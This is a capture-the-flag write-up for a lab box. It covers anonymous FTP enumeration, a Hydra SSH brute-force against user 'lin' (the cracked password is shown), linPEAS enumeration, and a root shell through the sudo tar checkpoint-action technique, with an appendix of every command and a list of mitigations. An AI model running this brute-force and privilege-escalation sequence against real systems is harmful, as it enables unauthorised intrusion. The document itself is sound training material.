# CTF Writeup — FTP to Root via SUID `tar` (TryHackMe style)

> Short summary  
> Gained initial access via anonymous FTP which contained a username hint and a wordlist. Performed a password guess (Hydra) against SSH for `lin`, obtained a user shell and `user.txt`. Ran linPEAS to enumerate privilege escalation vectors and discovered `tar` with SUID. Used a known GTFObins sudo `tar` abuse to spawn a root shell and read `root.txt`.

---

## Target
- IP: `10.10.169.105`
- Scan date (local notes): 2025-09-12

---

## 1 — Recon / Port scan

Command:
```bash
nmap -sS 10.10.169.105
```

Key output:
```
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
```

Notes: FTP, SSH and HTTP were open. Proceeded to check FTP first since anonymous logins are often enabled on CTF boxes.

---

## 2 — FTP enumeration

Connected as anonymous:
```
ftp> open 10.10.169.105
220 (vsFTPd 3.0.5)
Name (10.10.169.105:root): anonymous
230 Login successful.
ftp> ls
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
```

Downloaded and viewed files.

`task.txt`:
```
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-lin
```
- Observations: signed by `lin` — likely a username on the host.

`locks.txt`:
- Contained a list of words (used as a potential password list / dictionary).

Conclusion: `lin` is a likely user. `locks.txt` looks like a suitable wordlist for password guessing.

---

## 3 — SSH brute-force (password-guess)

Used Hydra with the `locks.txt` dictionary:
```bash
hydra -l lin -P locks.txt ssh://10.10.169.105
```

Hydra result:
```
[22][ssh] host: 10.10.169.105   login: lin   password: RedDr4gonSynd1cat3
```

Logged in via SSH:
```bash
ssh lin@10.10.169.105
# cat ~/Desktop/user.txt
THM{%flag removed%}
```

Obtained `user.txt` — user-level compromise achieved.

---

## 4 — Privilege escalation enumeration

Goal: escalate to root and read `/root/root.txt`.

Transferred linPEAS and ran it:
```bash
scp linpeas.sh lin@10.10.169.105:/tmp/
# on target
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh
```

Important linPEAS finding: `/bin/tar` is present and has SUID or is usable via `sudo` (linPEAS indicated a sudo rule or SUID bit relevant to `tar`).

Searched GTFObins for `tar` and found techniques allowing shell execution when `tar` is run with specific options / via sudo.

---

## 5 — Privilege escalation — abusing `tar` via sudo

Observed that `tar` can be invoked through sudo. The following command was used to spawn a shell as root:

```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Explanation:
- `--checkpoint=1` and `--checkpoint-action=exec=/bin/sh` cause `tar` to run `/bin/sh` as the checkpoint action.
- When run under `sudo` (and tar is allowed via sudo), this results in an interactive shell as root.

After running the command:
```
# whoami
root
```

---

## 6 — Root flag

With a root shell:
```bash
cat /root/root.txt
THM{%Flag Removed%}
```

Root flag obtained.

---

## 7 — Post-exploit notes & cleanup
- On real systems, avoid leaving tools or credentials. For CTFs, be mindful of artifacts.
- Files transferred (e.g., `linpeas.sh`) should be removed after use if appropriate:
  ```bash
  rm /tmp/linpeas.sh
  ```

---

## 8 — Mitigation & recommendations

1. **Avoid password reuse / weak/default passwords**  
   - The box used a guessable/weak password found in an exposed file. On production systems, never store passwords in plaintext files accessible via anonymous services. Enforce strong passwords and MFA where possible.

2. **Harden FTP / remove anonymous access**  
   - Disable anonymous FTP or restrict the served directories. Use secure file transfer services (SFTP/FTPS) instead.

3. **Least privilege for sudo**  
   - Review `/etc/sudoers` and sudoers.d to ensure users are not allowed to run arbitrary programs that can be abused to escalate privileges. Avoid allowing programs that accept arbitrary flags that can execute shell commands (or restrict them tightly).

4. **SUID binaries auditing**  
   - Remove unnecessary SUID/SGID bits from binaries. Audit all SUID binaries and validate their purpose. Use automated tools to check for known abuse patterns (e.g., GTFObins entries).

5. **Detect improper command usage**  
   - Monitor for suspicious use of utilities (`tar`, `less`, `vi`, `awk`, etc.) under sudo, and alert on unusual usages.

6. **Secrets management**  
   - Do not commit or expose secrets via services (FTP, web directories). Use secret managers for production credentials.

---

## 9 — References
- linPEAS — Privilege escalation auditing script (PEASS-ng).  
- GTFObins — collection of Unix binaries that can be abused to escalate privileges: https://gtfobins.github.io/gtfobins/tar/#sudo

---

## 10 — Appendix: commands used (extracted from notes)

```bash
# Recon
nmap -sS 10.10.169.105

# FTP
ftp 10.10.169.105
# login: anonymous
# download locks.txt, task.txt

# SSH brute force
hydra -l lin -P locks.txt ssh://10.10.169.105

# SSH to user
ssh lin@10.10.169.105
cat ~/Desktop/user.txt

# Transfer linPEAS
scp linpeas.sh lin@10.10.169.105:/tmp/
# on target
chmod +x /tmp/linpeas.sh
/tmp/linpeas.sh

# Privilege escalation (GTFObins technique)
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# Root actions
whoami
cat /root/root.txt
```
